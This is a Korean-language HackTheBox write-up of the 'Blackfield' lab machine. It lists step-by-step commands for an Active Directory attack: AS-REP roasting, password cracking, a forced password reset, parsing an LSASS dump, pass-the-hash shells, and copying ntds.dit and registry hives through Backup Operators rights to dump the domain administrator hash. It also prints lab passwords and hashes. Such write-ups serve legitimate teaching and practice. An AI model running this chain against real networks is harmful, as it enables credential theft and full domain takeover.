# Blackfield - HackTheBox
## Recon
```bash
sudo nmap -p 53,88,135,139,389,445,593,3268,5985 -sC -sV -vv -oA blackfield 10.129.229.17
```
<img width="1203" height="349" alt="image" src="https://github.com/user-attachments/assets/bf182a01-2168-4a01-8cff-aec7c148bacf" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)

<br>

- `/etc/hosts`에 `blackfield.local` 추가.
<img width="1203" height="71" alt="image" src="https://github.com/user-attachments/assets/30dfdb8c-0785-4825-ab2e-55bceb6fbc52" />

---
## Auth as support
- `guest` 로그인 성공.
```bash
nxc smb 10.129.229.17 -u guest -p ''
```
<img width="1203" height="124" alt="image" src="https://github.com/user-attachments/assets/8df349e4-4dba-4ec6-a87a-aa4c6f9cdb65" />

<br>
<br>

- `/etc/hosts`에 `dc01`추가.
<img width="1203" height="73" alt="image" src="https://github.com/user-attachments/assets/7b3db2f9-bb02-462a-b5b1-e2b2d3e8a1e3" />

<br>
<br>

- `--rid-brute`를 사용하여 유저 목록 생성.
```bash
nxc smb 10.129.229.17 -u guest -p '' --rid-brute|grep SidTypeUser
```
<img width="1203" height="312" alt="image" src="https://github.com/user-attachments/assets/ee102f19-b80b-46a2-8eac-7354481239fc" />

<br>
<br>

- `AS-REP` 공격 시도하여 `support`유저 해시 획득.
```bash
for user in $(cat users);do impacket-GetNPUsers -dc-ip 10.129.229.17 -no-pass blackfield.local/$user;done
```
<img width="1203" height="160" alt="image" src="https://github.com/user-attachments/assets/591f9aeb-2c74-4d7a-870e-3a13c175836a" />

<br>
<br>

- 크래킹 시도.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1205" height="266" alt="image" src="https://github.com/user-attachments/assets/fcc41dfa-968b-4edb-9572-322497f7589e" />

<br>
<br>

- `support:#00^BlackKnight` 로그인 성공.
```bash
nxc smb 10.129.229.17 -u support -p '#00^BlackKnight'
```
<img width="1202" height="117" alt="image" src="https://github.com/user-attachments/assets/54109cbf-9a30-4358-8a8d-1d1ae05014b1" />

---
## Auth as audit2020
- `bloodhound-python`을 사용하여 정보 수집.
-  `ForceChangePassword` 권한 발견.
```bash
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -c all --zip -ns 10.129.229.17
```
<img width="1055" height="117" alt="image" src="https://github.com/user-attachments/assets/42ee5b1a-d12c-47d2-abae-f5570627bf5f" />

<br>
<br>

- `audit2020`의 비밀번호 변경.
```bash
net rpc password 'audit2020' 'newP@ssword2026' -U blackfield.local/support%'#00^BlackKnight' -S 10.129.229.17
```
<img width="1204" height="186" alt="image" src="https://github.com/user-attachments/assets/4b3ce0b3-c623-4cf6-a774-171269887306" />

---
## Shell as svc_backup
- `audit2020`의 유저의 계정을 사용하여 `SMB`의 `forensic` 폴더 발견.
```bash
smbmap -u audit2020 -p 'newP@ssword2026' -H 10.129.229.17
```
<img width="1204" height="228" alt="image" src="https://github.com/user-attachments/assets/363635d6-33f2-4486-8630-57ee02103621" />

<br>
<br>

- `SMBclient`를 사용하여 접속.
```bash
smbclient -U audit2020 //10.129.229.17/forensic
```
<img width="1204" height="268" alt="image" src="https://github.com/user-attachments/assets/143428c5-73f8-4bc4-a535-a1961fc93ef8" />

<br>
<br>

- `/memory_analysis`에서 수상한 압축 파일 `lsass.zip` 발견.
<img width="1204" height="467" alt="image" src="https://github.com/user-attachments/assets/ac348d5f-1ec3-4553-80bf-1fbfa07b8b5a" />

<br>
<br>

- 로컬로 다운로드 받아서 압축 해제.
<img width="1204" height="274" alt="image" src="https://github.com/user-attachments/assets/e3b7ee3d-f535-49ef-8aff-31bb984bcc42" />

<br>
<br>

- `pypykatz`를 사용하여 덤프 파일 분석.
- 해시 획득.
```bash
pypykatz lsa minidump lsass.DMP > dump
```
<img width="1204" height="398" alt="image" src="https://github.com/user-attachments/assets/d2de26dc-682b-420a-9fb2-4d1278f0c6fc" />

<br>
<br>

- `svc_support` 로그인 성공.
```bash
nxc smb 10.129.229.17 -u users -H hash
```
<img width="1204" height="28" alt="image" src="https://github.com/user-attachments/assets/f069b7af-fcef-42d5-b0d5-343ac524d548" />

<br>
<br>

- `winrm` 로그인 성공.
```bash
nxc winrm 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```
<img width="1204" height="267" alt="image" src="https://github.com/user-attachments/assets/d6614023-94cb-487b-baa2-fc0755f5ab88" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```
<img width="1204" height="288" alt="image" src="https://github.com/user-attachments/assets/83a66033-d19d-4cab-8e5b-0a32cd2b3a08" />

---
## Privesc
- `Backup Operators`그룹에 속해 있음.
```powershell
whoami /all
```
<img width="1204" height="442" alt="image" src="https://github.com/user-attachments/assets/29237d83-ca6f-4311-ba5d-d906b9c02106" />

<br>
<br>

- `vss.dsh` 생성.
<img width="1204" height="137" alt="image" src="https://github.com/user-attachments/assets/e8e77562-0b25-4930-88be-37e5ce5d3f84" />

<br>
<br>

- 줄바꿈 변경.
```bash
unix2dos vss.dsh
```
<img width="1203" height="77" alt="image" src="https://github.com/user-attachments/assets/f3a27bdd-11ad-4dc9-8631-795a044975eb" />

<br>
<br>

- `vss.dsh`를 로컬로부터 다운로드 받아서 C드라이브를 X드라이브로 마운트.
```powershell
diskshadow /s vss.dsh
```
<img width="1204" height="246" alt="image" src="https://github.com/user-attachments/assets/6842bc87-d948-49a4-a4da-b8a4f3dde8a4" />

<br>
<br>

- 잠금파일에 모두 접근이 가능해졌으며 `robocopy`를 사용하여 `ntds.dit`를 복사.
```powershell
robocopy /b x:\windows\ntds . ntds.dit
```
<img width="1205" height="287" alt="image" src="https://github.com/user-attachments/assets/59a03ec1-d188-41e4-a3f2-b204d06a520f" />

<br>
<br>

- `SAM`과 `SYSTEM` 레지스트리 복사.
```powershell
reg save HKLM\SAM SAM

reg save HKLM\SYSTEM SYSTEM
```
<img width="1205" height="115" alt="image" src="https://github.com/user-attachments/assets/35b3e9fe-9e14-4632-91bd-b3fad2148d47" />

<br>
<br>

- 로컬로 다운로드 받아서 덤핑.
- `administrator` 해시 획득.
```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```
<img width="1205" height="333" alt="image" src="https://github.com/user-attachments/assets/8433c55e-e4cf-414e-8793-7c590c1b376f" />

<br>
<br>

- `administrator:184fb5e5178480be64824d4cd53b99ee` 로그인 성공.
<img width="1203" height="276" alt="image" src="https://github.com/user-attachments/assets/7bfbf0d4-aa93-4707-9a12-e52b5b412525" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.229.17 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```
<img width="1203" height="287" alt="image" src="https://github.com/user-attachments/assets/24e83af3-612d-44e7-9cef-6aa17640f4cf" />

---
## FLAG
- `c:\users\svc_backup\desktop\user.txt`
<img width="1203" height="207" alt="image" src="https://github.com/user-attachments/assets/fba1c22f-7ee2-4870-b886-e6071dab4161" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1203" height="225" alt="image" src="https://github.com/user-attachments/assets/2cab84a8-273c-4511-9a2a-98d3c7b8d6c5" />
